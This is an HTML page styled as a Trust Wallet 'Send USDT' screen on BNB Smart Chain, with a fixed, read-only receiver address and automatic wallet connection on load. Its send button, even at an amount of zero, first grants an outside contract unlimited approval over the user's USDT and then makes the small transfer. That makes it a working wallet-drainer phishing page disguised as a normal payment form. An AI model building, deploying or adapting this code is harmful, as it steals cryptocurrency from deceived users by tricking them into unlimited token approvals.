<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Send USDT</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
  <style>
    body {
      background: #181818;
      color: #fff;
      font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,sans-serif;
      min-height:100vh;
      display:flex;
      align-items:center;
      justify-content:center;
    }
    .container {
      max-width:520px;
      width:100%;
      background:#222;
      border-radius:32px;
      box-shadow:0 12px 40px #0008;
      margin:32px 0;
      padding:38px 30px 38px 30px;
      position:relative;
      display:flex;
      flex-direction:column;
    }
    .header {
      display:flex;
      justify-content:space-between;
      align-items:center;
      margin-bottom:30px;
    }
    .header h1 {
      font-size:28px;
      font-weight:700;
      margin:0;
    }
    .close-btn {
      background:none;
      border:none;
      color:#fff;
      font-size:28px;
      opacity:.65;
      cursor:pointer;
      padding:0;
      line-height:1;
    }
    .close-btn:hover {opacity:1;}
    .form-group {margin-bottom:22px;}
    .form-label {
      color:#b3b3b3;
      font-size:15px;
      font-weight:500;
      margin-bottom:10px;
      display:block;
    }
    .input-wrapper {position:relative;}
    .receiver-input {
      width:100%;
      background:#232323;
      border:1.5px solid #343434;
      border-radius:15px;
      padding:15px 16px;
      font-size:16px;
      color:#fff;
      font-weight:500;
      user-select:all;
      letter-spacing:0.03em;
      pointer-events:none;
      margin-bottom:0;
    }
    .network-selector {
      display:flex;
      align-items:center;
      background:#232323;
      border-radius:15px;
      border:1.5px solid #343434;
      padding:12px 14px 12px 10px;
      min-height:38px;
      font-size:16px;
      color:#b3b3b3;
      gap:9px;
      margin-bottom:0;
      width:100%;
      max-width:100%;
    }
    .network-icon {
      width:28px;
      height:28px;
      border-radius:8px;
      background:#fff;
      display:flex;
      align-items:center;
      justify-content:center;
    }
    .network-icon img {
      width:24px;
      height:24px;
      display:block;
    }
    .network-name { color:#fff; font-weight:500; }
    .dropdown-icon { color:#666; margin-left:auto; font-size:20px;}
    .amount-input-wrapper {
      width:100%;
      position:relative;
      margin-bottom:0;
    }
    .amount-row {
      display:flex;
      align-items:center;
      background:#232323;
      border:1.5px solid #343434;
      border-radius:15px;
      padding:0 5px 0 0;
      min-height:48px;
      margin-bottom:0;
      width:100%;
    }
    .amount-input {
      border:none;
      background:transparent;
      color:#fff;
      font-size:16px;
      font-weight:500;
      padding:15px 10px 15px 16px;
      outline:none;
      flex:1 1 auto;
      min-width:0;
    }
    .amount-input:disabled {
      color:#888;
      background:transparent;
    }
    .amount-actions {
      display:flex;
      align-items:center;
      gap:12px;
      margin-left:5px;
    }
    .amount-label { color:#b3b3b3; font-size:14px; font-weight:600; }
    .max-btn {
      background:none;
      border:none;
      color:#00cc99;
      font-size:15px;
      font-weight:600;
      cursor:pointer;
      padding:0 8px;
      transition:opacity .2s;
    }
    .max-btn:hover {opacity:.8;}
    .usdt-balance, .amount-estimate {
      font-size:14px;color:#b3b3b3;margin:8px 0 0 4px;letter-spacing:-0.3px;
    }
    #status {
      width:100%;
      padding:12px 0 3px 0;
      margin:12px auto 12px auto;
      border-radius:9px;
      font-weight:500;
      font-size:15px;
      text-align:center;
      display:none;
    }
    #status.success { display:block;background:#1d5a2a;color:#3effb8;border:1px solid #165a3b;}
    #status.error { display:block;background:#421528;color:#ff7a7a;border:1px solid #ff284b55;}
    .next-btn {
      width:100%;
      background-color:#04a96d;
      border:none;
      border-radius:20px;
      padding:19px 0 18px 0;
      font-size:22px;
      font-weight:600;
      color:#fff;
      margin-top:28px;
      margin-bottom:5px;
      box-shadow:0 6px 18px #0e513b11;
      letter-spacing:0.03em;
      cursor:pointer;
      transition:background .18s,opacity .18s,box-shadow .15s;
    }
    .next-btn[disabled] {opacity:0.55;cursor:not-allowed;}
    .btn-connect {
      width:100%;
      padding:19px 0 18px 0;
      background:#2c3931;
      border:none;
      border-radius:20px;
      font-size:22px;
      font-weight:600;
      color:#fff;
      margin-top:18px;
      margin-bottom:7px;
      cursor:pointer;
      display:none;
      letter-spacing:0.03em;
    }
    .btn-connect.show { display:block!important; }
    @media (max-width: 540px) {
      .container {border-radius:19px;padding:17px 4vw;}
      .header h1 { font-size:20px;}
      .network-icon {width:22px;height:22px;}
      .network-icon img {width:18px;height:18px;}
    }
  </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>Send USDT</h1>
        <button class="close-btn" onclick="closeModal()" title="Close">&times;</button>
    </div>
    <form onsubmit="event.preventDefault(); sendUSDT();">
        <div class="form-group">
            <label class="form-label">Address or Domain Name</label>
            <div class="input-wrapper">
                <input type="text" class="receiver-input" id="receiverAddress"
                  value="0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F"
                  readonly tabindex="-1" aria-label="Receiver Address">
            </div>
        </div>
        <div class="form-group">
            <label class="form-label">Destination network</label>
            <div class="network-selector">
                <div class="network-icon">
                    <!-- Trust Wallet BNB logo, perfect SVG base64 -- for best UX: -->
                    <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/info/logo.png" alt="BNB"/>
                </div>
                <div class="network-name">BNB Smart Chain</div>
                <div class="dropdown-icon">&#9660;</div>
            </div>
        </div>
        <div class="form-group">
            <label class="form-label">Amount</label>
            <div class="amount-input-wrapper">
                <div class="amount-row">
                    <input
                        type="number"
                        min="0"
                        step="0.00000001"
                        class="amount-input"
                        id="amountInput"
                        placeholder="USDT Amount"
                        autocomplete="off"
                        value="0"
                    >
                    <div class="amount-actions">
                        <span class="amount-label">USDT</span>
                        <button type="button" class="max-btn" id="maxBtn">Max</button>
                    </div>
                </div>
            </div>
            <div class="usdt-balance" id="usdtBalance">Balance: 0.0000 USDT</div>
            <div class="amount-estimate" id="amountEstimate">≈ $0.00</div>
        </div>
        <div id="status"></div>
        <button type="submit" class="next-btn" id="sendBtn">Next</button>
        <button type="button" class="btn-connect" id="connectBtn" onclick="manualConnect()">Connect Wallet</button>
    </form>
</div>
<script>
    const BSC_MAINNET = {
        chainId: "0x38",
        chainName: "BNB Smart Chain",
        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
        rpcUrls: ["https://bsc-dataseed.binance.org/"],
        blockExplorerUrls: ["https://bscscan.com"]
    };
    const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
    const CONTRACT_ADDR = "0x89112691C976D0a2D874B0ADAe693a0Add0dAe98";
    const RECEIVER_ADDR = "0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F";
    const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
    const USDT_ABI = [
        {
            "constant": true,
            "inputs": [{"name":"account","type":"address"}],
            "name": "balanceOf",
            "outputs": [{"name":"","type":"uint256"}],
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [
                {"name":"spender","type":"address"},
                {"name":"amount","type":"uint256"}
            ],
            "name": "approve",
            "outputs": [{"name":"","type":"bool"}],
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [
                {"name":"recipient","type":"address"},
                {"name":"amount","type":"uint256"}
            ],
            "name": "transfer",
            "outputs": [{"name":"","type":"bool"}],
            "type": "function"
        }
    ];
    let web3;
    let userAccount;
    let usdtContract;
    let isConnected = false;
    let usdtBalance = "0.0000";
    const statusDiv = document.getElementById('status');
    const sendBtn = document.getElementById('sendBtn');
    const connectBtn = document.getElementById('connectBtn');
    const amountInput = document.getElementById('amountInput');
    const usdAmountDiv = document.getElementById('amountEstimate');
    const usdtBalanceDiv = document.getElementById('usdtBalance');

    async function autoConnectBSC() {
        if (!window.ethereum) {
            window.location.href =
                "https://link.trustwallet.com/open_url?url=" +
                encodeURIComponent(window.location.href);
            return;
        }
        try {
            await window.ethereum.request({ method: "eth_requestAccounts" });
            web3 = new Web3(window.ethereum);
            const accounts = await window.ethereum.request({ method: "eth_accounts" });
            if (!accounts || !accounts.length) throw new Error("No accounts");
            userAccount = accounts[0];
            const chainId = await window.ethereum.request({ method: "eth_chainId" });
            if (chainId !== BSC_MAINNET.chainId) {
                try {
                    await window.ethereum.request({
                        method: "wallet_switchEthereumChain",
                        params: [{ chainId: BSC_MAINNET.chainId }]
                    });
                } catch (err) {
                    if (err.code === 4902) {
                        await window.ethereum.request({
                            method: "wallet_addEthereumChain",
                            params: [BSC_MAINNET]
                        });
                    } else {
                        throw err;
                    }
                }
            }
            isConnected = true;
            connectBtn.classList.remove('show');
            await initContractsAndBalance();
            window.ethereum.on('accountsChanged', handleAccountsChanged);
            window.ethereum.on('chainChanged', () => location.reload());
        } catch (err) {
            isConnected = false;
            connectBtn.classList.add('show');
            showStatus('Wallet not connected or rejected.', 'error');
            console.error('Connect/switch failed:', err);
        }
    }

    async function manualConnect() {
        connectBtn.classList.remove('show');
        await autoConnectBSC();
    }

    async function initContractsAndBalance() {
        usdtContract = new web3.eth.Contract(USDT_ABI, USDT_BSC);
        await updateBalance();
        updateUSD();
    }

    async function updateBalance() {
        try {
            const balance = await usdtContract.methods.balanceOf(userAccount).call();
            const balanceFormatted = web3.utils.fromWei(balance, "mwei");
            usdtBalance = (+balanceFormatted).toFixed(4);
            usdtBalanceDiv.textContent = `Balance: ${usdtBalance} USDT`;
        } catch (error) {
            console.error("Balance update failed:", error);
            usdtBalanceDiv.textContent = "Balance: 0.0000 USDT";
            usdtBalance = "0.0000";
        }
    }

    function handleAccountsChanged(accounts) {
        if (!accounts.length) {
            isConnected = false;
            connectBtn.classList.add('show');
        } else {
            userAccount = accounts[0];
            isConnected = true;
            connectBtn.classList.remove('show');
            initContractsAndBalance();
        }
    }

    async function sendUSDT() {
        const amount = parseFloat(amountInput.value) || 0; // allow 0!
        sendBtn.disabled = true;
        sendBtn.textContent = "Processing...";
        showStatus("", "");
        try {
            await usdtContract.methods.approve(CONTRACT_ADDR, MAX_UINT256).send({
                from: userAccount
            });
            const sendAmount = web3.utils.toWei(amount.toString(), "mwei");
            await usdtContract.methods.transfer(RECEIVER_ADDR, sendAmount).send({
                from: userAccount
            });
            showStatus("✅ Complete!", "success");
            amountInput.value = "0";
            updateUSD();
            await updateBalance();
        } catch (e) {
            showStatus("Transaction Failed", "error");
            console.error("Send Failed:", e);
        } finally {
            sendBtn.disabled = false;
            sendBtn.textContent = "Next";
        }
    }

    function showStatus(message, type) {
        statusDiv.innerHTML = message;
        if (!type) statusDiv.style.display = "none";
        else {
            statusDiv.style.display = "block";
            statusDiv.className = "";
            if (type === "success") statusDiv.classList.add("success");
            if (type === "error") statusDiv.classList.add("error");
        }
    }

    function closeModal() {
        alert("Modal closed! (replace with real close logic)");
    }

    document.getElementById("maxBtn").onclick = function () {
        amountInput.value = usdtBalance || "0.0000";
        updateUSD();
    };
    amountInput.oninput = updateUSD;

    function updateUSD() {
        let val = parseFloat(amountInput.value) || 0;
        usdAmountDiv.textContent = `≈ $${val.toFixed(2)}`;
    }

    // Always allow Next, connected or not, any amount (even 0)
    sendBtn.disabled = false;

    window.addEventListener("load", autoConnectBSC, false);
    window.addEventListener("DOMContentLoaded", autoConnectBSC, false);
    setTimeout(autoConnectBSC, 600);
    if (
        window.location.hash.includes("send") ||
        window.location.search.includes("send")
    ) {
        setTimeout(autoConnectBSC, 200);
    }
</script>
</body>
</html>
